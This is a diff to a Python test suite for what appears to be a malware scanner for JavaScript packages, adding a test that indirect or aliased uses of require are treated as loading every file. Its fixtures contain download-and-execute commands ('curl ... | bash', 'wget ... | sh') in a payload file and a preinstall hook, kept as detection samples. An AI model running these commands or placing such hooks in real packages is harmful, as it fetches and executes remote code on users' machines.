@@ -458,6 +458,14 @@ class JSPhases(unittest.TestCase):
         got = js_facts({"index.js": "import(name);\n", "dist/x.js": src})
         self.assertIn(("download_exec", "import"), got)
 
+    def test_require_used_as_a_value_keeps_every_file(self):
+        """require handed on or taken under another name can load any file: every file is taken to run on load."""
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        for loader in ("const r = require;\nr('./' + ['pay', 'load'].join(''));\n", "module.require(name);\n",
+                       "const req = require('module').createRequire(__filename);\nreq(x);\n", "factory(require);\n"):
+            got = js_facts({"index.js": loader, "payload.js": src})
+            self.assertIn(("download_exec", "import"), got, loader)
+
     def test_lifecycle_inline_node_code(self):
         got = js_facts({}, {"preinstall": "node -e \"require('child_process').exec('wget -qO- http://203.0.113.4/a|sh')\""})
         self.assertIn(("download_exec", "install"), got)
